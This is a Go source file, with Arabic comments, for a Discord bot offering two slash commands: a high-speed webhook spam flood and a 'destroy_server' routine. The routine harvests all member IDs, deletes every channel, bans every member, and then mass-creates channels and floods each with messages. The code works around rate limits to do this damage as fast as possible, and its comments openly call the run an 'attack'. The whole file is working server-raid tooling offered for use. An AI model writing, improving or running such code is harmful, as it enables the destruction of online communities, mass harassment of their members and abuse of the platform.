package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 10000,
		IdleConnTimeout:     60 * time.Second,
	},
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdWhSpam := "wh_spam"
	commandWhSpam := &discordgo.ApplicationCommand{
		Name:        cmdWhSpam,
		Description: "سبام ويب هوك فائق السرعة",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionChannel,
				Name:        "channel",
				Description: "الروم المستهدف",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل الإجمالي المطلوب",
				Required:    true,
			},
		},
	}

	cmdDestroy := "destroy_server"
	commandDestroy := &discordgo.ApplicationCommand{
		Name:        cmdDestroy,
		Description: "أمر تدمير السيرفر الخارق",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ هذا الأمر للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		cmdName := i.ApplicationCommandData().Name

		if cmdName == cmdWhSpam {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ سبام الويب هوك الفائق...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			channelID := optionMap["channel"].ChannelValue(s).ID
			messageContent := optionMap["message_content"].StringValue()
			webhookName := optionMap["webhook_name"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			go runWebhookSpamLoop(token, channelID, webhookName, messageContent, messagesCount, s)

		} else if cmdName == cmdDestroy {
			// رد فوري للمشرف بأن عملية التجهيز بدأت
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "⚡ جاري تجهيز الهجوم الخارق (3 ثواني للتحضير)...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestructionWithWarmup(token, guildID, roomName, roomsCount, messageContent, messagesCount, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
	fmt.Println("🤖 البوت شغال الآن وجاهز للسرعة القصوى!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func runWebhookSpamLoop(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
	sentCounter := 0
	var mu sync.Mutex
	webhookCount := 25

	for {
		mu.Lock()
		if sentCounter >= totalGoal {
			mu.Unlock()
			break
		}
		mu.Unlock()

		urls := createWebhooks(token, channelID, webhookName, webhookCount)
		if len(urls) == 0 {
			time.Sleep(30 * time.Millisecond)
			continue
		}

		burstSendFast(urls, messageContent, &sentCounter, totalGoal, &mu)
		deleteWebhooks(token, urls)
	}
}

func createWebhooks(token, channelID, webhookName string, count int) []string {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	payload, _ := json.Marshal(map[string]string{"name": webhookName})
	var activeURLs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < count; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			resp, err := httpClient.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var wh map[string]interface{}
				if err := json.NewDecoder(resp.Body).Decode(&wh); err == nil {
					if id, ok := wh["id"].(string); ok {
						if tkn, ok := wh["token"].(string); ok {
							url := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tkn)
							mu.Lock()
							activeURLs = append(activeURLs, url)
							mu.Unlock()
						}
					}
				}
			}
		}()
	}
	wg.Wait()
	return activeURLs
}

func deleteWebhooks(token string, urls []string) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	var wg sync.WaitGroup
	for _, url := range urls {
		wg.Add(1)
		go func(whURL string) {
			defer wg.Done()
			delReq, _ := http.NewRequest("DELETE", whURL, nil)
			for k, v := range headers {
				delReq.Header.Set(k, v)
			}
			if resp, err := httpClient.Do(delReq); err == nil {
				resp.Body.Close()
			}
		}(url)
	}
	wg.Wait()
}

func burstSendFast(urls []string, messageContent string, sentCounter *int, totalGoal int, mu *sync.Mutex) {
	stopSignal := make(chan struct{})
	var wg sync.WaitGroup
	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	for _, url := range urls {
		wg.Add(1)
		go func(whURL string) {
			defer wg.Done()
			for {
				select {
				case <-stopSignal:
					return
				default:
				}

				mu.Lock()
				if *sentCounter >= totalGoal {
					mu.Unlock()
					return
				}
				mu.Unlock()

				req, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

				resp, err := httpClient.Do(req)
				if err != nil {
					continue
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					mu.Lock()
					*sentCounter++
					mu.Unlock()
				} else if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(5 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
			}
		}(url)
	}

	for {
		mu.Lock()
		if *sentCounter >= totalGoal {
			mu.Unlock()
			close(stopSignal)
			break
		}
		mu.Unlock()
		time.Sleep(1 * time.Millisecond)
	}

	wg.Wait()
}

func executeDestructionWithWarmup(token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	// ==========================================
	// مرحلة التحضير الخارق (3 ثواني في الذاكرة)
	// ==========================================
	fmt.Println("⚡ جاري تحضير الـ Payloads وسحب الأعضاء والقنوات...")

	// 1. تجهيز بيانات إنشاء الرومات مسبقاً في الذاكرة
	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	// 2. تجهيز محتوى الرسائل مسبقاً
	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	// 3. سحب لستة الأعضاء دفعة واحدة وتخزين الـ IDs بالذاكرة
	var allUserIDs []string
	after := ""
	for {
		members, err := s.GuildMembers(guildID, after, 1000)
		if err != nil || len(members) == 0 {
			break
		}
		for _, m := range members {
			if m != nil && m.User != nil {
				allUserIDs = append(allUserIDs, m.User.ID)
				after = m.User.ID
			}
		}
		if len(members) < 1000 {
			break
		}
	}

	// 4. جلب القنوات القديمة وتخزينها للذف الفوري
	var oldChannelIDs []string
	reqCh, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
	if err == nil {
		for k, v := range headers {
			reqCh.Header.Set(k, v)
		}
		resp, err := httpClient.Do(reqCh)
		if err == nil {
			var channels []map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&channels)
			resp.Body.Close()
			for _, ch := range channels {
				if id, ok := ch["id"].(string); ok {
					oldChannelIDs = append(oldChannelIDs, id)
				}
			}
		}
	}

	// انتظار انتهاء الـ 3 ثواني بالضبط لتكتمل كل عمليات التحضير والتهيئة بالذاكرة
	time.Sleep(3 * time.Second)
	fmt.Println("🚀 تم الانتهاء من التحضير.. إطلاق الهجوم الآن!")

	// ==========================================
	// مرحلة الإطلاق الخارق (تنفيذ فوري بدون أي تأخير)
	// ==========================================

	// أ. حذف القنوات القديمة دفعة واحدة
	var wgDel sync.WaitGroup
	for _, id := range oldChannelIDs {
		wgDel.Add(1)
		go func(chID string) {
			defer wgDel.Done()
			delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
			for k, v := range headers {
				delReq.Header.Set(k, v)
			}
			if r, e := httpClient.Do(delReq); e == nil {
				r.Body.Close()
			}
		}(id)
	}

	// ب. حظر جميع الأعضاء دفعة واحدة وبأقصى سرعة
	var wgBan sync.WaitGroup
	for _, userID := range allUserIDs {
		wgBan.Add(1)
		go func(uid string) {
			defer wgBan.Done()
			banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
			for {
				banReq, _ := http.NewRequest("PUT", banURL, nil)
				for k, v := range headers {
					banReq.Header.Set(k, v)
				}

				resp, err := httpClient.Do(banReq)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(10 * time.Millisecond)
					}
					continue
				}
				resp.Body.Close()
				break
			}
		}(userID)
	}

	// ج. إنشاء الرومات الجديدة دفعة واحدة باستخدام البيانات الجاهزة مسبقاً
	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	for _, payload := range channelPayloads {
		wgCreate.Add(1)
		go func(p []byte) {
			defer wgCreate.Done()
			for {
				reqCreate, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				for k, v := range headers {
					reqCreate.Header.Set(k, v)
				}

				resp, err := httpClient.Do(reqCreate)
				if err != nil {
					return
				}

				if resp.StatusCode == 429 {
					retryAfterStr := resp.Header.Get("Retry-After")
					resp.Body.Close()
					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
					} else {
						time.Sleep(10 * time.Millisecond)
					}
					continue
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
						if chID, ok := chResult["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, chID)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
				break
			}
		}(payload)
	}
	wgCreate.Wait()

	// د. إرسال الرسائل فوراً بكل الرومات الجديدة دفعة واحدة
	var wgMsg sync.WaitGroup
	for _, chID := range newChannelIDs {
		wgMsg.Add(1)
		go func(chIDParam string) {
			defer wgMsg.Done()
			var wgInnerMsg sync.WaitGroup

			for m := 0; m < messagesCount; m++ {
				wgInnerMsg.Add(1)
				go func() {
					defer wgInnerMsg.Done()
					for {
						msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
						for k, v := range headers {
							msgReq.Header.Set(k, v)
						}

						msgResp, err := httpClient.Do(msgReq)
						if err != nil {
							return
						}

						if msgResp.StatusCode == 429 {
							retryAfterStr := msgResp.Header.Get("Retry-After")
							msgResp.Body.Close()
							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
								time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
							} else {
								time.Sleep(5 * time.Millisecond)
							}
							continue
						}
						msgResp.Body.Close()
						break
					}
				}()
			}
			wgInnerMsg.Wait()
		}(chID)
	}

	wgDel.Wait()
	wgMsg.Wait()
}
